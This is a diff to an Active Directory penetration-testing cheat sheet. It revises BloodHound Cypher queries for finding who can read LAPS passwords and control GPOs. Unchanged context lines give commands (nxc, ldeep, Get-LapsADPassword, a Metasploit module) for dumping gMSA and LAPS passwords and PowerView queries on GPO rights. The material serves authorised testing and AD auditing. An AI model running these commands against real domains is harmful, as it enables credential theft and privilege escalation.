@@ -47,9 +47,9 @@
 - `nxc ldap <ip> -u <user> -p <pass> --gmsa`
 - `ldeep ldap -u <user> -p <password> -d <domain> -s ldaps://<dc_ip> gmsa`
 
-## Get laps passwords
-- who can read LAPS
-  - `MATCH p=(g:Group)-[:ReadLAPSPassword]->(c:Computer) RETURN p`
+## Get LAPS passwords
+- Who can read LAPS
+  - `MATCH p=(g:Base)-[:ReadLAPSPassword]->(c:Computer) RETURN p`
 - Read LAPS >>> Admin
   - `Get-LapsADPassword -DomainController <ip_dc> -Credential <domain>\<login> | Format-Table -AutoSize`
   - `ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> laps`
@@ -58,7 +58,8 @@
   - `msf> use post/windows/gather/credentials/enum_laps`
 
 ## GPO
-- `MATCH (gr:Group), (gp:GPO), p=((gr)-[:GenericWrite]->(gp)) RETURN p`
+- Who can control GPOs
+  - `MATCH p=((n:Base)-[]->(gp:GPO)) RETURN p`
 - SID of principals that can create new GPOs in the domain
   - `Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=blah,DC=com" -ResolveGUIDs  | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl`
 - Return the principals that can write to the GP-Link attribute on OUs
